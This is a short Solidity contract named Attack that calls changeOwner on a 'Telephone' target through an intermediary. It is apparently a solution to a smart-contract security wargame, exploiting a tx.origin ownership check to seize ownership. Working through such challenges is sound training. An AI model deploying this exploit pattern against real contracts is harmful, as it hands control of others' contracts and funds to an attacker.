// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Attack {
    ITelephone public target;

    constructor(address _targetAddress) {
        target = ITelephone(_targetAddress);
    }

    function attack(address _newOwner) public {
        target.changeOwner(_newOwner);
    }
}
